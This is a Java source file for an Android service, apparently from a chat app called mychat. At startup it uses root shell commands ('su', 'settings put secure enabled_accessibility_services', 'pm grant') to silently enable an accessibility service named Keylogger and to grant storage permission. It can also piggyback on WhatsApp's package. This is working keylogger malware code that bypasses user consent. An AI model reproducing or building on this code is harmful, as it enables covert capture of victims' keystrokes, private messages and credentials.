package com.example.mychat;

import android.app.IntentService;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.DataOutputStream;

import androidx.annotation.Nullable;

public class StartupService extends IntentService {

    final private String accessibilityPackage = "com.example.mychat";
    final private String packageName = ParametersConfig.isPiggyBacked() ? "com.whatsapp" : accessibilityPackage; // to debug

    public StartupService() {
        super("StartupIntentService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        enableAccessibility();
        enableStoragePermissions();
    }

    private void enableStoragePermissions(){
        Log.d("StartupIntentService", "Enabling Storage permissions...");
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("pm grant " + packageName + " android.permission.WRITE_EXTERNAL_STORAGE\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
            if (process.exitValue() == 0){
                Log.d("StartupIntentService", "Storage permissions enabled");
            } else {
                Log.d("StartupIntentService", "Storage permissions not enabled, exit code:" + process.exitValue());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void enableAccessibility(){
        Log.d("StartupIntentService", "Enabling Accessibility Service...");
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("settings put secure enabled_accessibility_services " + packageName +"/"+ accessibilityPackage + ".Keylogger\n");
            os.flush();
            os.writeBytes("settings put secure accessibility_enabled 1\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();

            process.waitFor();
            if (process.exitValue() == 0){
                Log.d("StartupIntentService", "Accessibility Service enabled");
            } else {
                Log.d("StartupIntentService", "Accessibility Service not enabled, exit code:" + process.exitValue());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}